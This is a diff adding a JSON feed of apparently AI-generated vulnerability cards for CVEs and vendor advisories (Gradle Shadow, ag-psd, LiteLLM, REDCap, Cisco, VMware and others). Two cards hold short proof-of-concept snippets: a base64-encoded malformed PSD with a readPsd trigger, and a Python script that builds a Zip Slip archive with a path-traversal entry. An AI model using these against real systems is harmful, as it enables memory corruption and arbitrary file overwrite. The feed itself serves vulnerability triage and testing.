+        "base64 -d > poc.psd <<'EOF'\nOEJQUwABAAAAAAAAAA0AADcuAAA58wAgAAMAAAAAAAAAAAAAAAAAAdEgNZv+i9bc9ygd2A==\nEOF",
+        "const { readPsd } = require('ag-psd');\nconst buf = require('fs').readFileSync('poc.psd');\nreadPsd(buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength));"
+      ],
+      "remediation": "Validate the declared dimensions, channel count, depth, and per-layer rectangles against the actual input length and a sane maximum before allocating memory.",
+      "references": [
+        "https://github.com/advisories/GHSA-qfx6-q44v-9qqw"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "ghsa-ghsa-rr8v-fxxf-c986",
+    "CVE_ID": "CVE-2026-75598",
+    "Title": "[MAVEN] Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization",
+    "Source_URL": "https://github.com/advisories/GHSA-rr8v-fxxf-c986",
+    "Content_Hash": "78bbdff57e76cfbe68c2b2fbe7ad6f8f5865b7e140566348e05b3420af2ad963",
+    "chunk_ids": [
+      "ghsa-ghsa-rr8v-fxxf-c986::t1::000",
+      "ghsa-ghsa-rr8v-fxxf-c986::t2::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:41.979044+00:00",
+    "card": {
+      "mechanism": "The Shadow plugin in Gradle does not validate or sanitize ZIP entry names before writing them to the output fat JAR, allowing malicious entries with path traversal sequences to be included.",
+      "impact": "This vulnerability can lead to arbitrary file overwrite on any system that extracts the shadow JAR using unprotected extraction methods. Users on Gradle versions < 7.6.2 / 8.x < 8.2.0 are directly vulnerable at build time.",
+      "testing_syntax": [
+        "import zipfile\nwith zipfile.ZipFile('evil.jar', 'w') as zf:\n    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')"
+      ],
+      "remediation": "Upgrade to Gradle 7.6.2 or 8.2.0 and ensure that any downstream consumers of the shadow JAR use protected extraction methods to mitigate the risk.",
+      "references": [
+        "https://github.com/advisories/GHSA-rr8v-fxxf-c986"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 4,
+      "failures": [],
+      "attempts": 2
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "apple-149851",
+    "CVE_ID": null,
+    "Title": "Apple Security Release: HomeView Software Version 27.2",
+    "Source_URL": "https://support.apple.com/en-us/149851",
+    "Content_Hash": "0e35ff517ee12938118876ed61e3c8a58288d80d79665562fbf16db2d4607d6a",
+    "chunk_ids": [
+      "apple-149851::t1::000",
+      "apple-149851::t1::001",
+      "apple-149851::t1::002"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:52.769026+00:00",
+    "card": {
+      "mechanism": "The AirPlay vulnerability involves a logic issue that allows an attacker in Bluetooth range to bypass the rate limit on pairing code attempts. The Bluetooth vulnerability is a use-after-free issue that can be exploited to corrupt process memory.",
+      "impact": "An attacker in Bluetooth range can bypass the rate limit on pairing code attempts and potentially pair with a device without user interaction. The Bluetooth vulnerability also allows an attacker to corrupt process memory, affecting HomeView Software Version 27.2.",
+      "testing_syntax": [],
+      "remediation": "Update to HomeView Software Version 27.2 to address the logic and memory management issues.",
+      "references": [
+        "https://support.apple.com/en-us/149851",
+        "https://support.apple.com/content/dam/edam/applecare/images/en_US/otherassets/security/149851.json"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 3,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-40217",
+    "CVE_ID": "CVE-2026-40217",
+    "Title": "CVE-2026-40217 - BerriAI LiteLLM Unprotected Alternate Channel Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-40217",
+    "Content_Hash": "d164efc17d82d4b0d17ade5b0e092c9f17b49d30d66693f1fee588872b934b57",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-40217::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:20:29.431862+00:00",
+    "card": {
+      "mechanism": "BerriAI LiteLLM contains an unprotected alternate channel vulnerability that allows remote attackers to execute arbitrary code by rewriting bytecode at the /guardrails/test_custom_code URI.",
+      "impact": "Remote attackers can execute arbitrary code on affected versions of BerriAI LiteLLM.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations as per the vendor instructions and follow CISA’s BOD 26-04 guidance. If mitigations are unavailable, discontinue use of the product.",
+      "references": [
+        "https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-40217"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-90817",
+    "CVE_ID": "CVE-2026-90817",
+    "Title": "CVE-2026-90817 - Vanderbilt University Research Electronic Data Capture (REDCap) Code Injection Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-90817",
+    "Content_Hash": "f39fd16ff64f0a4447fc60300e3cc4b6d770b4c126436224ad31d5b4ee794345",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-90817::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:20:49.811288+00:00",
+    "card": {
+      "mechanism": "The vulnerability in Vanderbilt University Research Electronic Data Capture (REDCap) allows an unauthenticated attacker to inject and execute arbitrary code on the server by crafting HTTP requests that access an unintended controller route from a public survey context and supplying a crafted file-path or stream parameter during data import processing.",
+      "impact": "An attacker can execute arbitrary code on the server if they know a valid public survey hash. This affects versions of REDCap that are not patched against this vulnerability.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by the vendor in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://projectredcap.org/resources/community",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-90817"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-90436",
+    "CVE_ID": "CVE-2026-90436",
+    "Title": "CVE-2026-90436 - Apache Axis Unsafe Reflection Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-90436",
+    "Content_Hash": "9cc9cc15ab0a66385998f3697c0c6f6505ad6fa54a55f1f722a09eaadb4845d1",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-90436::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:19.528823+00:00",
+    "card": {
+      "mechanism": "Apache Axis contains an unsafe reflection vulnerability that allows an unauthenticated remote attacker to execute arbitrary code by sending a crafted SOAP fault message, which causes Axis to load and instantiate an attacker-specified class.",
+      "impact": "An attacker can achieve remote code execution if a suitable class is available on the application classpath. This affects Apache Axis.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and CISA’s BOD 26-04 guidance. Discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://lists.apache.org/thread/8slf0j9gz35z56t0glt5h0ncwlbn4bdz",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-90436"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-115731",
+    "CVE_ID": "CVE-2026-115731",
+    "Title": "CVE-2026-115731 - Perforce Puppet Enterprise Deserialization of Untrusted Data Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-115731",
+    "Content_Hash": "5bfc8aa500dc603a0881278af1325ddad5d4743f43e39dc9a4fa4a17874e03ab",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-115731::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:25.957434+00:00",
+    "card": {
+      "mechanism": "Perforce Puppet Enterprise contains a deserialization of untrusted data vulnerability in Puppet’s report-processing code. This allows a client with a CA-signed agent certificate to execute arbitrary code on the Puppet Server as the service user by submitting a crafted report through a PUT request.",
+      "impact": "An attacker can execute arbitrary code on the Puppet Server as the service user. If the certificate authority automatically signs requests without strong verification, an unauthenticated network attacker can obtain a valid certificate and exploit the vulnerability.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and patching guidelines.",
+      "references": [
+        "https://portal.perforce.com/s/cve/a91Qi000003IaHpIAK/report-deserialization-code-execution",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-115731"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2024-10441",
+    "CVE_ID": "CVE-2024-10441",
+    "Title": "CVE-2024-10441 - Synology DiskStation Manager (DSM) Improper Encoding or Escaping of Output Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2024-10441",
+    "Content_Hash": "de6deeb40a76766538cb6a4431f2193d90aaec2f3a3df65ba70033d452ac9167",
+    "chunk_ids": [
+      "cisa-kev-cve-2024-10441::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:33.812894+00:00",
+    "card": {
+      "mechanism": "The vulnerability in Synology DiskStation Manager (DSM) involves improper encoding or escaping of output in the system plugin daemon, which can be exploited by a remote attacker.",
+      "impact": "A remote attacker can execute arbitrary code via unspecified vectors, affecting Synology DSM and Synology BeeStation OS (BSM).",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by Synology in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with patching guidelines and evaluate the internet exposure of affected assets.",
+      "references": [
+        "https://www.synology.com/zh-tw/security/advisory/Synology_SA_24_20",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2024-10441"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116411",
+    "CVE_ID": "CVE-2026-116411",
+    "Title": "CVE-2026-116411 - Dell PowerStore contains a Server-Side Request Forgery (SSRF) vulnerability. An authentica...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116411",
+    "Content_Hash": "d8443d6dfe96d68291f334c35787190fa9a88674094e21c4e130345416fdb253",
+    "chunk_ids": [
+      "nvd-cve-2026-116411::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:40.854529+00:00",
+    "card": {
+      "mechanism": "The vulnerability in Dell PowerStore allows an authenticated user with limited privileges to perform Server-Side Request Forgery (SSRF) attacks, which can lead to information disclosure by making requests to internal services.",
+      "impact": "An attacker can exploit this vulnerability to gain unauthorized access to internal services, potentially leading to information disclosure. This affects Dell PowerStore models 500T, 1000T, 1200T, 3000T, 3200Q, 3200T, 5000T, 5200Q, 5200T, 7000T, 9000T, 9200T, 1500, 5500, and 9500 with versions earlier than 5.1.0.0-2798105.",
+      "testing_syntax": [],
+      "remediation": "Update the affected Dell PowerStore models to version 5.1.0.0-2798105 or later to mitigate this vulnerability.",
+      "references": [
+        "https://www.dell.com/support/kbdoc/en-us/000527640/dsa-2026-479-dell-powerstore-t-security-update-for-multiple-vulnerabilities"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 2,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116413",
+    "CVE_ID": "CVE-2026-116413",
+    "Title": "CVE-2026-116413 - Dell PowerStore contains a use-of-broken-cryptography vulnerability. A low-privileged atta...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116413",
+    "Content_Hash": "ec5fed7b7ef3b43165cbed07a304dc017203c82f3787189725f560d6243cf6e4",
+    "chunk_ids": [
+      "nvd-cve-2026-116413::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:49.316618+00:00",
+    "card": {
+      "mechanism": "Dell PowerStore contains a use-of-broken-cryptography vulnerability, allowing a low-privileged attacker to exploit weak cryptographic algorithms.",
+      "impact": "A low-privileged attacker can impersonate another identity, potentially leading to unauthorized access. This affects Dell PowerStore models 500T, 1000T, 1200T, 3000T, 3200Q, 3200T, 5000T, 5200Q, 5200T, 7000T, 9000T, 9200T, 1500, 5500, and 9500 with versions earlier than 5.1.0.0-2798105.",
+      "testing_syntax": [],
+      "remediation": "Update to version 5.1.0.0-2798105 or later to mitigate this vulnerability.",
+      "references": [
+        "https://www.dell.com/support/kbdoc/en-us/000527640/dsa-2026-479-dell-powerstore-t-security-update-for-multiple-vulnerabilities"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 2,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "apple-149721",
+    "CVE_ID": null,
+    "Title": "Apple Security Release: tvOS 27.2.1",
+    "Source_URL": "https://support.apple.com/en-us/149721",
+    "Content_Hash": "3d9f8f570cbcf20e05d87807c9a4fe16049085ca2fddcbf8f771dd737b6e381c",
+    "chunk_ids": [
+      "apple-149721::t1::000",
+      "apple-149721::t1::001"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-20T14:21:57.225366+00:00",
+    "card": {
+      "mechanism": "The AirPlay vulnerability in tvOS 27.2.1 allows an attacker within Bluetooth range to bypass the rate limit on pairing code attempts. This is due to a logic issue that was addressed with improved state management.",
+      "impact": "An attacker within Bluetooth range can bypass the rate limit on pairing code attempts, affecting Apple TV 4K 2nd generation and later.",
+      "testing_syntax": [],
+      "remediation": "Update to tvOS 27.2.1 to address the logic issue and improve state management.",
+      "references": [
+        "https://support.apple.com/en-us/149721",
+        "https://support.apple.com/content/dam/edam/applecare/images/en_US/otherassets/security/149721.json"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 3,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-129448",
+    "CVE_ID": "CVE-2026-129448",
+    "Title": "CVE-2026-129448 - Apache Roller Deserialization of Untrusted Data Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-129448",
+    "Content_Hash": "0ce3dcae5457e45b27f348ae0ae2741892fa5d982e9af4c16455e57d1bd4f06d",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-129448::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-21T07:40:13.070142+00:00",
+    "card": {
+      "mechanism": "Apache Roller contains a deserialization of untrusted data vulnerability that allows an unauthenticated remote attacker to execute arbitrary code via the XML-RPC endpoint.",
+      "impact": "An attacker can execute arbitrary code on affected versions of Apache Roller, leading to remote code execution.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and follow CISA’s BOD 26-04 guidance for prioritizing security updates based on risk. Discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://lists.apache.org/thread/cc0jck13nb9vvcmzxzwotr6n16mx28z9",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-129448"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-123890",
+    "CVE_ID": "CVE-2026-123890",
+    "Title": "CVE-2026-123890 - VMWare vCenter Authentication Bypass Using an Alternate Path or Channel Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-123890",
+    "Content_Hash": "81de0f01d2010962f8f4469b5c7dcb45c621b382dc2f7fd53491a278202f9450",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-123890::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-21T07:40:20.117113+00:00",
+    "card": {
+      "mechanism": "The vulnerability in Broadcom VMware vCenter allows an unauthenticated attacker to bypass authentication through an alternate path or channel in the VMware Directory Service.",
+      "impact": "An attacker can gain unauthorized access to the vCenter system, potentially leading to further exploitation. This affects all versions of VMware vCenter.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by the vendor and follow CISA’s BOD 26-04 guidance for prioritizing security updates. Ensure compliance with CISA’s ‘Forensics Triage Requirements’.",
+      "references": [
+        "https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/39495",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-123890"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-76466",
+    "CVE_ID": "CVE-2026-76466",
+    "Title": "CVE-2026-76466 - Cisco Expressway Series Use of Hard-coded Credentials Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-76466",
+    "Content_Hash": "cbd21a4bc42ed0388ab8a780897de0ff735ad8d1522374caf6b6c86694d6fc31",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-76466::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-21T07:40:27.317662+00:00",
+    "card": {
+      "mechanism": "The Cisco Expressway Series contains a hard-coded credentials vulnerability that allows an unauthenticated, remote attacker to execute commands as root on a clustered device via the database service.",
+      "impact": "An attacker can gain root access to the device, enabling them to execute commands with the highest privileges. This affects all versions of the Cisco Expressway Series.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by Cisco in accordance with CISA’s BOD 26-04 guidance. If mitigations are unavailable, discontinue use of the product.",
+      "references": [
+        "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vcs-static-cred-hr7EWZ8t",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-76466"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2025-42884",
+    "CVE_ID": "CVE-2025-42884",
+    "Title": "CVE-2025-42884 - SAP NetWeaver Improper Neutralization of Special Elements in Data Query Logic Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2025-42884",
+    "Content_Hash": "f51603fe09d3f3582a466ba8a3ef565af29d8d603511603ecbb4a490eef0e13c",
+    "chunk_ids": [
+      "cisa-kev-cve-2025-42884::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-21T07:40:35.406094+00:00",
+    "card": {
+      "mechanism": "The vulnerability in SAP NetWeaver Enterprise Portal allows an unauthenticated attacker to inject JNDI environment properties or a URL used during JNDI lookup operations, leading to improper neutralization of special elements in data query logic.",
+      "impact": "An attacker can exploit this vulnerability to disclose or modify server information. All versions of SAP NetWeaver Enterprise Portal are affected.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by SAP in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and patching guidelines.",
+      "references": [
+        "https://support.sap.com/en/my-support/knowledge-base/security-notes-news/bulletin-2025.html",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-42884"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  }
+]
